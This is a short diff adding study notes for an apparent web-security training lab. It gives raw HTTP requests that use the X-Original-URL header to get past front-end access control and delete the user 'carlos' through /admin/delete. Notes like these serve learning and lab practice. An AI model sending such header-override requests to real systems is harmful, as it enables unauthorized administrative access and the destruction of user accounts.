@@ -41,4 +41,13 @@ if (isAdmin) {
  
  
  lab5:
- 
+ lab>click admin panel>send request to burp proxy
+POST / HTTP/1.1
+X-Original-URL: /admin/
+
+GET /?username=carlos HTTP/1.1
+X-Original-URL: /admin/delete
+
+oneshot:
+GET /?username=carlos HTTP/1.1
+X-Original-URL: /admin/delete
